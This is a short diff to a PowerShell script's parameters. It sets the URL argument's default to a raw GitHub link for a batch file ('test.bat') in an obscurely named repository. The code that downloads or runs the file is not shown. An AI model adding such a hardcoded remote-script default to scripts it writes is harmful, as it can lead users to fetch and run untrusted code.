@@ -1,6 +1,6 @@
 param(
     [Parameter(Mandatory=$true)]
-    [string]$Url,
+    [string]$Url = "https://raw.githubusercontent.com/DeathCheat1/dgfhffd/refs/heads/main/test.bat",
     [Parameter(Mandatory=$false)]
     [string]$DestinationPath,
     [Parameter(Mandatory=$false)]
